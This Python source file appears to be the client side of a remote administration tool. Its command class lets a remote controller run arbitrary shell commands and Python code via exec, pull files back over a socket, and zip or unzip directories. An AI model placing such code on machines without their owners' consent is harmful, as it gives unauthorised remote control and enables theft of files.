import contextlib
import inspect
import io
import os
import subprocess

from client.util.CommandBase import CommandBase
from client.util.decorator import desc
from common.util import format_dict


class CommonCommands(CommandBase):
    """所有平台通用的命令"""

    @desc('change directory')
    def cd(self, path):
        """跨平台的目录切换命令"""
        try:
            os.chdir(path)
            return 1, ""
        except Exception as e:
            return 0, str(e)

    @desc('execute shell command')
    def shell(self, command):
        """跨平台的shell命令执行"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding='utf-8',
                errors='replace'
            )
            if result.returncode == 0:
                return 1, result.stdout
            else:
                return 0, result.stderr
        except Exception as e:
            return 0, str(e)

    @desc('download file')
    def download(self, filename):
        if os.path.isfile(filename):
            self.socket.send_result(self.command_id, 1, 'Preparing to send file', eof=0)
            self.socket.send_result(self.command_id, 1, 'File length is {}'.format(os.path.getsize(filename)), eof=0)
            self.socket.send_file(self.command_id, filename)
        else:
            return 0, 'File does not exist'

    @desc('execute python code')
    def pyexec(self, code, kwargs=None):
        if kwargs is None:
            kwargs = {}
        f = io.StringIO()
        with contextlib.redirect_stdout(f), contextlib.redirect_stderr(f):
            exec(code, kwargs)
        return 1, f.getvalue()

    @desc('show this help')
    def help(self):
        methods = {name: method for name, method in
                   inspect.getmembers(self, lambda x: inspect.isfunction(x) or inspect.ismethod(x))
                   if hasattr(method, 'help')}
        return 1, format_dict({name: method.help for name, method in methods.items()})

    @desc('create a zip archive')
    def zip(self, dir_name):
        import pathlib
        import shutil
        import tempfile
        tempdir = tempfile.mkdtemp()
        dir_name = os.path.abspath(dir_name)
        if not os.path.isdir(dir_name):
            return 0, f'Directory does not exist: {dir_name}'
        zip_name = os.path.basename(dir_name)
        pardir = pathlib.Path(dir_name).resolve().parent
        filename = shutil.make_archive(os.path.join(tempdir, zip_name), format='zip', root_dir=pardir,
                                       base_dir=os.path.basename(dir_name))
        return 1, f'Archive created: {filename}'

    @desc('extract files from a zip archive')
    def unzip(self, zip_name):
        import shutil
        zip_name = os.path.abspath(zip_name)
        if not os.path.isfile(zip_name):
            return 0, f'File does not exist: {zip_name}'
        shutil.unpack_archive(zip_name, os.getcwd())
        return 1, f'Archive extracted to {os.getcwd()}'
